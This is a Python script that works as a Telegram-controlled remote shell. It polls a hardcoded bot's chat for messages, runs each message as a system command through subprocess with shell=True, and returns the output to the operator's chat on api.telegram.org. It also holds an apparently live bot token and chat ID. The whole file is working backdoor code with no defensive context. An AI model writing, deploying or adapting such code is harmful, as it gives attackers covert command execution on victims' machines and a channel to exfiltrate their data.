import requests
import subprocess
import time

TOKEN = "8508402230:AAGK5iP1fxc7Dscu5pDmqWkAGLCCYLtKrB0"
CHAT_ID = "8897834377"
BASE = "https://api.telegram.org/bot" + TOKEN

offset = 0

def send(text):
    for i in range(0, len(text), 4000):
        try:
            requests.post(BASE + "/sendMessage", data={"chat_id": CHAT_ID, "text": text[i:i+4000]})
        except Exception:
            pass

def run(cmd):
    try:
        out = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
        output_text = (out.stdout + out.stderr).decode(errors="replace")
        return output_text if output_text.strip() else "[No Output]"
    except subprocess.TimeoutExpired:
        return "[!] Timeout (60s)"
    except Exception as e:
        return "[!] Error: " + str(e)

send("[+] Client Connected Successfully")

while True:
    try:
        url = BASE + "/getUpdates"
        r = requests.get(url, params={"offset": offset + 1, "timeout": 30}, timeout=35).json()
        for upd in r.get("result", []):
            offset = upd.get("update_id", offset)
            msg = upd.get("message", {})
            if str(msg.get("chat", {}).get("id")) != CHAT_ID:
                continue
            cmd = msg.get("text", "").strip()
            if cmd == "/exit":
                send("[+] Closing Client")
                raise SystemExit
            if cmd:
                res = run(cmd)
                send(res)
    except SystemExit:
        break
    except Exception:
        time.sleep(5)
        
